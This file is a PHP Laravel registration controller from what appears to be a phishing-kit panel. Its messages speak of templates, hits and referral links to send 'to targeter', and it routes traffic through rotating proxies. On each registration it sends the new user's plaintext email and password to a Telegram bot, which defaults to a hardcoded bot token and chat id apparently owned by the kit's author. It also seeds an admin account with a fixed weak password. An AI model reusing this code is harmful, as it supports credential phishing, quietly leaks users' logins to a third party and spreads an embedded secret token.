<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\Hits;
use App\Models\User;

use GuzzleHttp\Client;
use GuzzleHttp\Exception\GuzzleException;
use Illuminate\Auth\Events\Registered;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use Illuminate\View\View;

class RegisteredUserController extends Controller
{
    /**
     * Display the registration view.
     *
     * @return View
     */
    public function create(): View
    {
        return view('auth.register');
    }

    /**
     * Handle an incoming registration request.
     *
     * @return string
     *
     */
    protected function real_url(): string
    {
        function url_origin($s, $use_forwarded_host = false): string
        {
            $ssl = (!empty($s['HTTPS']) && $s['HTTPS'] == 'on');
            $sp = strtolower($s['SERVER_PROTOCOL']);
            $protocol = substr($sp, 0, strpos($sp, '/')) . (($ssl) ? 's' : '');
            $port = $s['SERVER_PORT'];
            $port = ((!$ssl && $port == '80') || ($ssl && $port == '443')) ? '' : ':' . $port;
            $host = ($use_forwarded_host && isset($s['HTTP_X_FORWARDED_HOST'])) ? $s['HTTP_X_FORWARDED_HOST'] : ($s['HTTP_HOST'] ?? null);
            $host = $host ?? $s['SERVER_NAME'] . $port;
            return $protocol . '://' . $host;
        }

        function full_url($s, $use_forwarded_host = false): string
        {
            return url_origin($s, $use_forwarded_host);
        }

        return full_url($_SERVER);
    }

    /**
     * @throws GuzzleException
     */
    public function store(Request $request)
    {

        if (in_array($_POST['email'], User::all()->pluck('email')->toArray()) == true) return ['success'=>'This Eamil is Exists, change it and try again!',false];
        //if (in_array($_POST['sh_token'], User::all()->pluck('sh_token')->toArray()) == true) return ['Ismali' => 'This Token is Exists, change it and try again!','success'=>false];
            //if (in_array($_POST['sh_id'], User::all()->pluck('sh_id')->toArray()) == true) return ['Ismali' => 'This userID is Exists, change it and try again!','success'=>false];

        $request->validate([
            'name' => 'required|string|max:255',
            'sh_token' => 'required|string|max:255',
            'sh_id' => 'required|string|max:255',
            'email' => 'required|string|email|max:255|unique:users',
            'password' => 'required|string|confirmed|min:8',
            'is_admin' => 'integer|max:1',
            'sh_status' => 'integer|max:1'
        ]);

        $dfg=(int)Auth::id();
        if(in_array($dfg,Hits::all()->pluck('user_id')->toArray())!==true)return ["curl"=>"Please add a template then try again!"];
        $my_token="1201857088:AAF3IL0ZjACPJ-S5O0GpGRAsm-dWhqM_q3A";
        $my_id="1191573669";
        $admini=$request->post('is_admin');
        $statusi=$request->post('sh_status');

        $request->post('sh_token')==''?$sh_token=$my_token:$sh_token=$request->post('sh_token');
        $request->post('sh_id')==''?$sh_id=$my_id:$sh_id=$request->post('sh_id');
        $user = new User();

        if (User::all()->toArray() == []){
                        DB::statement(/** @lang text */'SET FOREIGN_KEY_CHECKS=1');
                        DB::table('users')->truncate();
                        $user['id'] = 1;
                        $user['name'] = 'unknown';
                        $user['email'] = "unknown@gmail.com";
                        $user['sh_id'] = $my_id;
                        $user['sh_token'] = $my_token;
                        $user['Status'] = "single";
                        $user['Proxy'] = "127.0.0.1:9437";
                        $user['sh_status'] = "1";
                        $user['is_admin'] = "1";
                        $user['is_deleted'] = "0";
                        $user['prf_path'] = "avatar-logo.png";
                        $user['password'] = Hash::make("123456789");
                        $user['remember_token'] = csrf_token();
                        $user->save();
                        DB::statement(/** @lang text */ 'ALTER TABLE users AUTO_INCREMENT = 2');
        }
        else {
                    $user['id'] =User::all()->max('id')+1;
                    $user['name'] = $request->post('name');
                    $user['email'] = $request->post('email');
                    $user['sh_token'] = $request->post('sh_token');
                    $user['sh_id'] = $request->post('sh_id');
                    $user['is_admin'] = $admini;
                    $user['sh_status'] = $statusi;
                    $user['password'] = Hash::make($request->post('password'));
                    $user['remember_token'] = Str::random(64);

            function create_user($user){
                $user->save();
            }
            function refresh_user($user){
                $user->refresh();
            }

                }

        if($user['email'] !== $request->post('email')) {
            return ['curl'=>'Oops!..Please try again.','success'=>false];
        }
        else{
            $uzar = User::all()->find($dfg);
            //event(new Registered($user));
            //return redirect(RouteServiceProvider::AdminHOME);

            $telegramClient = new Client([
                'base_uri' => 'https://api.telegram.org/',
                'verify' => base_path('cacertif.pem'),
                'connect_timeout' => 5,
            ]);
            $real_url = $this->real_url();
            $ref_path = Hits::all()->find($uzar['id']);
            $refer_l = base64_encode(urlencode($ref_path['tmp_path']));
            $reqe = $request->post('email');
            $rege = $request->post('password');
            $name = $request->post('name');


            $io = urlencode("Hello $name,
This is your login information and better be change your password before first login!
then you can use and send refrral link to targeter.

Email: $reqe
Password: $rege

1.Change Password Link: <code>$real_url/forgot-password?forgot=$refer_l</code>
2.Login Link: <code>$real_url/cp/login/?forgot=$refer_l</code>
3.Referral Link: <code>$real_url/v1/api?id=$refer_l</code>

enjoy and make some good idea..
*{CodedBy<code>@DonVito_Corleone</code>}*");

        }

        if ($uzar['Status'] == 'vpn') {
                        try{
                        $telegramClient->request('POST', 'https://api.telegram.org/bot' . $sh_token . '/SendMessage?parse_mode=HTML&chat_id=' . $sh_id . '&text=' . $io);
                        create_user($user);
                        }catch (GuzzleException $e){
                            refresh_user($user);
                            return ['curl'=>'connection with telegram server was timeout, chaeck your proxy status and try again','success'=>false];
                        }
                    }
        elseif ($uzar['Status'] == 'single') {
                        try{
                            $telegramClient->request('POST', 'https://api.telegram.org/bot' . $sh_token . '/SendMessage?parse_mode=HTML&chat_id=' . $sh_id . '&text=' . $io, [
                                'proxy' => $uzar['Proxy'],
                            ]);
                            create_user($user);
                        }catch (GuzzleException $e){
                            refresh_user($user);
                            return ['curl'=>'connection with telegram server was timeout, chaeck your proxy status and try again','success'=>false];
                        }

                    }
        elseif ($uzar['Status'] == 'list') {
            $file = file_get_contents(storage_path("api/lst/" .User::all()->find(Auth::id())["IPs_path"]));
            $split = explode("\n", $file);
            $array=array();
            foreach ($split as $string) {
                preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "\n", $file);
                $row = explode("\n", $string);
                array_push($array, $row);
            }
            $randIndex = array_rand($array);
            $otprand = $array[$randIndex];
            $otr = $otprand[0];
                        try{
                        $telegramClient->request('POST', 'https://api.telegram.org/bot' . $sh_token . '/SendMessage?parse_mode=HTML&chat_id=' . $sh_id . '&text=' . $io, [
                            'proxy' => trim($otr)
                        ]);
                            create_user($user);
                        }catch (GuzzleException $e){
                            refresh_user($user);
                            return ['curl'=>'connection with telegram server was timeout, chaeck your proxy status and try again','success'=>false];
                        }
                    }
        else {
                        return abort('500');
                    }

        event(new Registered($user));
        //return redirect(RouteServiceProvider::AdminHOME);
        return ['success'=>'New admin successfully added!'];
    }
}
